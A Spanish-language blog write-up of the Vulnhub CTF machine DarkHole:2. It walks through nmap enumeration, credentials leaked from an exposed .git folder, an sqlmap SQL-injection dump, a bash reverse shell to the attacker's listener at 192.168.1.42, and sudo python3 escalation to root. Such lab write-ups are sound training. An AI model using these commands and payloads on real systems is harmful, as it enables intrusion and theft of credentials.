---
layout: single
title: DarkHole:2 - WriteUp
excerpt: WriteUp de la máquina DarkHole:2 de Vulnhub.
date: 2023-01-24
classes: wide
header:
  teaser: /assets/images/darkhole-review/dark2.png
  teaser_home_page: true
  icon: /assets/images/darkhole-review/dark2.png
categories:
  - infosec
tags:  
  - ctf
  - WriteUp
  - SQLI
  - Data Exfiltration
---


**¡Buenas!** Hoy estaremos resolviendo la máquina [DarkHole-2](https://www.vulnhub.com/entry/darkhole-2,740/) de la plataforma Vulnhub, comencemos... 

### Enumeración.

Lo primero será lanzar un escaneo de puertos con nmap:

```bash
❯ nmap -sS --min-rate 5000 -sCV --open -n -Pn -p- -oN Ports 192.168.1.83
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-24 19:01 CET
Nmap scan report for 192.168.1.83
Host is up (0.0011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   192.168.1.83:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole V2
MAC Address: 00:0C:29:BA:C3:82 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

Podemos observar que están abiertos los puertos:

- 22 -> SSH
- 80 -> HTTP

Si accedemos al puerto 80 podemos ver un panel de login del cual no tenemos credenciales. Pero si nos fijamos en el escaneo de nmap podemos ver que hemos descubierto un directorio /.git/

Vamos a descargarnos de forma recursiva el directorio para enumerarlo.

```bash
❯ wget --recursive 192.168.1.83:80/.git/
```

Nos hemos descargado los siguientes archivos/carpetas:

```bash
❯ ls -la
drwxr-xr-x xxx xxx  66 B  Tue Jan 24 19:10:44 2023  .
drwxr-xr-x xxx xxx  40 B  Tue Jan 24 19:10:44 2023  ..
drwxr-xr-x xxx xxx 436 B  Tue Jan 24 19:10:44 2023  .git
drwxr-xr-x xxx xxx  76 B  Tue Jan 24 19:10:44 2023  icons
drwxr-xr-x xxx xxx  70 B  Tue Jan 24 19:10:45 2023  style
.rw-r--r-- xxx xxx 740 B  Tue Jan 24 19:10:44 2023  index.html
.rw-r--r-- xxx xxx 1.0 KB Tue Jan 24 19:10:44 2023  login.php
```

Ahora vamos a hacer uso de la herramienta git para ver los commits que se han hecho a lo largo de desarrollo de lo que parece una aplicación web.

```bash
❯ git log
commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300

    i changed login.php file for more secure

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:02:44 2021 +0300

    First Initialize
```

Podemos ver que el commit *a4d900a8d85e8938d3601f3cef113ee293028e10* ha añadido al fichero login.php unas **credenciales por defecto**. Vamos a seguir haciendo uso de la herramienta git para acceder a ese commit.

```php
❯ git show a4d900a                                                                                                                                                                           
commit a4d900a8d85e8938d3601f3cef113ee293028e10                                                                                                                                              
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

diff --git a/login.php b/login.php
index e69de29..8a0ff67 100644
--- a/login.php
+++ b/login.php
@@ -0,0 +1,42 @@
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
+    }
```

Vemos unas credenciales y un correo en texto plano

- `lush@admin.com:321`

Si probamos a iniciar sesión con estos datos podremos a acceder a la aplicación web.
En ella podremos actualizar nuestros datos de perfil. Si nos fijamos en la url podremos observar un parámetro **id** que es vulnerable a **SQLI error based**

Vamos a hacer uso de la herramienta SQLMAP para extraer las bases de datos existentes.

```bash
❯ sqlmap -u "http://192.168.1.83/dashboard.php?id=1" --cookie "PHPSESSID=m4p16840eqi6g1alsg4phhbi6m" -D darkhole_2 --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:28:03 /2023-01-24/

[19:28:04] [INFO] resuming back-end DBMS 'mysql' 
[19:28:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1888 FROM (SELECT(SLEEP(5)))CTUu) AND 'LLdB'='LLdB

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-8315' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178626a71,0x566363776d5573774f7a77506458427547515a41465456786f6c6643454a524f696f426a72564775,0x717a7a7a71),NULL-- -
---
[19:28:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[19:28:04] [INFO] fetching tables for database: 'darkhole_2'
[19:28:04] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
[19:28:04] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
Database: darkhole_2
Table: ssh
[1 entry]
+----+------+--------+
| id | pass | user   |
+----+------+--------+
| 1  | fool | jehad  |
+----+------+--------+

[19:28:04] [INFO] table 'darkhole_2.ssh' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.1.83/dump/darkhole_2/ssh.csv'
[19:28:04] [INFO] fetching columns for table 'users' in database 'darkhole_2'
[19:28:04] [INFO] fetching entries for table 'users' in database 'darkhole_2'
Database: darkhole_2
Table: users
[1 entry]
+----+----------------+---------------+----------+-----------------------------+----------------+
| id | email          | address       | password | username                    | contact_number |
+----+----------------+---------------+----------+-----------------------------+----------------+
| 1  | lush@admin.com | <h1>test</h1> | 321      | Jehad Alqurashiasddasdasdas | 1111111111     |
+----+----------------+---------------+----------+-----------------------------+----------------+

[19:28:04] [INFO] table 'darkhole_2.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.1.83/dump/darkhole_2/users.csv'
[19:28:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.83'
[19:28:04] [WARNING] your sqlmap version is outdated

[*] ending @ 19:28:04 /2023-01-24/
```

Hemos extraído un usuario y contraseña de la tabla ssh de la base de datos DarkHole2:

- **jehad:fool**

Con estos datos podemos iniciar sesión por SSH
```bash
❯ ssh jehad@192.168.1.83
jehad@192.168.1.83's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 24 Jan 2023 06:30:22 PM UTC

  System load:  0.03               Processes:              234
  Usage of /:   52.3% of 12.73GB   Users logged in:        0
  Memory usage: 21%                IPv4 address for ens33: 192.168.1.83
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

249 updates can be applied immediately.
180 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Jan 24 17:13:33 2023 from 192.168.1.42
jehad@darkhole:~$ id
uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
jehad@darkhole:~$
```

Si enumeramos el historial  del usuario podemos observar que hace unas peticiones web a un puerto local --> 9999  **pasándole un comando por GET al parámetro cmd**

```bash
jehad@darkhole:~$ head .bash_history 
clear
ls -la
cat id_rsa
clear
netstat -tulpn | grep LISTEN
ssh -L 127.0.0.1:9999:192.168.135.129:9999 jehad@192.168.135.129
curl http://localhost:9999
curl "http://localhost:999/?cmd=id" 
curl "http://localhost:9999/?cmd=id" 
curl http://localhost:9999/
```

Al tratar de hacer esas peticiones podemos ver que se están ejecutando como otro usuario del sistema **(losy)**.

```bash
jehad@darkhole:~$ curl "http://127.0.0.1:9999/?cmd=id"
Parameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)
uid=1002(losy) gid=1002(losy) groups=1002(losy)
```


Vamos a tratar de escalar privilegios y conseguir una shell como este usuario.
Para ello nos pondremos a la escucha con netcat por el puerto 443 en nuestra máquina local.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
```

Y ahora ejecutaremos el siguiente comando en la máquina víctima:

```bash
jehad@darkhole:~$ curl -G http://127.0.0.1:9999/ --data-urlencode "cmd= bash -c 'bash -i >& /dev/tcp/192.168.1.42/443 0>&1'"
```

Si **revisamos nuestro listener** veremos que hemos obtenido una **revshell**.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
192.168.1.83: inverse host lookup failed: Unknown host
connect to [192.168.1.42] from (UNKNOWN) [192.168.1.83] 37822
bash: cannot set terminal process group (1165): Inappropriate ioctl for device
bash: no job control in this shell
losy@darkhole:/opt/web$ id
id
uid=1002(losy) gid=1002(losy) groups=1002(losy)
losy@darkhole:/opt/web$
```

Ahora podremos leer la flag de usuario. Si seguimos enumerando, al igual que antes, podremos encontrar datos en nuestro historial de comandos de usuario.

```bash
losy@darkhole:~$ cat .bash_history                                                                                                                                                           
cd .ssh/                                                                                                                                                                                     
chmod 666 id_rsa                                                                                                                                                                             
php -S localhost:9999                                                                                                                                                                        
clear                                                                                                                                                                                        
sudo su                                                                                                                                                                                      
su lama                                                                                                                                                                                      
clear                                                                                                                                                                                        
ls -la                                                                                                                                                                                       
cat /etc/crontab                                                                                                                                                                             
su lama                                                                                                                                                                                      
mkdir web                                                                                                                                                                                    
ls -la                                                                                                                                                                                       
su lama                                                                                                                                                                                      
ls                                                                                                                                                                                           
touch index.php                                                                                                                                                                              
cd ..                                                                                                                                                                                        
ls                                                                                                                                                                                           
ls -la                                                                                                                                                                                       
sudo su                                                                                                                                                                                      
c                                                                                                                                                                                            
clear                                                                                                                                                                                        
su lama                                                                                                                                                                                      
clear                                                                                                                                                                                        
su lama                                                                                                                                                                                      
mysql -e '\! /bin/bash'                                                                                                                                                                      
mysql -u root -p -e '\! /bin/bash'
P0assw0rd losy:gang
```

Podemos observar unas credenciales que corresponden con nuestro usuario "losy"

- losy:gang

Si miramos nuestros privilegios de sudo vemos que podemos ejecutar como root **python3**.

```bash
losy@darkhole:~$ sudo -l
[sudo] password for losy: 
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```

Ahora podremos escalar privilegios y convertirnos en usuario root de una forma sencilla.
Importando la libreria **os.py** podremos ejecutar comandos a nivel de sistema.

```python
losy@darkhole:~$ sudo python3
Python 3.8.10 (default, Jun  2 2021, 10:49:15) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('bash')
root@darkhole:/home/losy#
```
